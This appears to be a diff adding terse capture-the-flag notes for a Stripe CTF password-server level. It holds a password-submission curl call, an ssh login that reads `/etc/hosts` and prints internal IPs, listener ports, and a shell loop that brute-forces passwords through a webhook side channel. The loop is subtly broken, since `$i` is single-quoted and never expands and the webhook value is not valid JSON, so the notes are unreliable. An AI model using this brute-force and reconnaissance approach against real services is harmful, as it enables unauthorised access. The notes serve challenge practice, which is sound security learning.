@@ -1,0 +1,29 @@
+curl https://level08-4.stripe-ctf.com/user-lxulnzkywg/ -d '{"password": "129934229425", "webhooks": []}'
+{"success": true}
+---
+ssh user-yuzpmgidbb@level02-2.stripe-ctf.com
+user-yuzpmgidbb@leveltwo2:~$ cat /etc/hosts
+127.0.0.1 localhost leveltwo2.ctf-1.stripe-ctf.com leveltwo2 level02-2.stripe-ctf.com
+
+# hosts.yaml generated from AWS at Wed Aug 15 03:41:15 +0000 2012
+
+# The following lines are desirable for IPv6 capable hosts
+::1 ip6-localhost ip6-loopback
+fe00::0 ip6-localnet
+ff00::0 ip6-mcastprefix
+ff02::1 ip6-allnodes
+ff02::2 ip6-allrouters
+ff02::3 ip6-allhosts
+
+10.0.1.43 level05-2.stripe-ctf.com
+10.0.2.205 level02-1.stripe-ctf.com
+10.0.1.253 level08-2.stripe-ctf.com
+10.0.1.52 level02-2.stripe-ctf.com
+---
+List instance @ 0x7f4be2106098
+('127.0.0.1', 12347)
+('127.0.0.1', 12348)
+('127.0.0.1', 12349)
+('127.0.0.1', 12350)
+---
+for i in $(seq 0 999); do echo -n "$i: "; curl -s https://level08-2.stripe-ctf.com/user-wuwdhsoezx/ -d '{"password": "$i", "webhooks": [127.0.0.1:12348]}' | grep -v false; echo -n; done
